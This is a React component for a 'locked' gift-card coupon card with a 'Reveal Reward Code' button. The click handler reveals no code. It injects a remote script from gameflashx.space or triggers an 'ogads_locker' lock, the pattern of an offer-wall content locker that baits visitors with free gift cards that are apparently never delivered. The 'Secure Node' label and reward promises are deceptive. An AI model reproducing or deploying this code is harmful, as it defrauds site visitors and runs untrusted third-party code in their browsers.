'use client';

import { Gift, Lock, Zap } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { giftCards } from '@/lib/gift-cards';

interface InteractiveCouponCardProps {
  brand: string;
  value: string;
  description: string;
}

export function InteractiveCouponCard({ brand, value, description }: InteractiveCouponCardProps) {
  const handleLockerTrigger = () => {
    if (typeof window !== 'undefined') {
      if (!document.getElementById('ogjs')) {
        const s = document.createElement('script');
        s.type = 'text/javascript';
        s.id = 'ogjs';
        s.src = 'https://gameflashx.space/cl/js/277ood';
        document.head.appendChild(s);
      } else {
        const win = window as any;
        if (win.ogads_locker && typeof win.ogads_locker.lock === 'function') {
          win.ogads_locker.lock();
        }
      }
    }
  };

  return (
    <div className="relative group mb-4 md:mb-6">
      <div className="glass-card rounded-[1.5rem] md:rounded-[2rem] transition-all duration-500 bg-[#0a0a0a]">
        <div className="p-5 md:p-8">
          <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-6 md:gap-8">
            <div className="flex flex-col sm:flex-row items-start sm:items-center gap-5 md:gap-6 flex-grow">
              <div className="relative shrink-0">
                <div className="w-14 h-14 md:w-20 md:h-20 rounded-xl md:rounded-2xl bg-primary/10 flex items-center justify-center border border-primary/20">
                  <Gift className="w-7 h-7 md:w-10 md:h-10 text-primary" />
                </div>
                <div className="absolute -top-1.5 -right-1.5 bg-primary rounded-full p-1 border-2 border-black shadow-lg">
                  <Lock className="w-2.5 h-2.5 text-white" />
                </div>
              </div>
              <div className="min-w-0 w-full">
                <div className="flex flex-wrap items-center gap-2 mb-2">
                  <span className="text-[8px] md:text-[10px] font-black text-primary uppercase tracking-[0.2em]">Secure Node</span>
                  <Badge variant="outline" className="text-[7px] font-black uppercase tracking-widest px-2 py-0 h-4 border-white/10 text-primary bg-primary/10">
                    LOCKED
                  </Badge>
                </div>
                <h3 className="text-xl md:text-3xl font-black text-white uppercase tracking-tight mb-1 truncate">
                  {value} {brand} Code
                </h3>
                <p className="text-xs md:text-sm text-muted-foreground leading-relaxed line-clamp-2 lg:line-clamp-none">
                  {description}
                </p>
              </div>
            </div>

            <div className="w-full lg:w-auto shrink-0 mt-2 lg:mt-0">
              <Button 
                onClick={handleLockerTrigger}
                className="w-full lg:w-72 h-14 md:h-16 bg-primary hover:bg-primary/90 text-white font-black uppercase tracking-widest rounded-xl md:rounded-2xl shadow-xl transition-all text-xs md:text-sm"
              >
                Reveal Reward Code <Zap className="ml-2 w-4 h-4 md:w-5 md:h-5" />
              </Button>
            </div>
          </div>
        </div>

        <div className="hidden lg:block absolute top-1/2 -left-4 -translate-y-1/2 w-8 h-8 bg-[#000000] rounded-full border border-white/10" />
        <div className="hidden lg:block absolute top-1/2 -right-4 -translate-y-1/2 w-8 h-8 bg-[#000000] rounded-full border border-white/10" />
      </div>
    </div>
  );
}
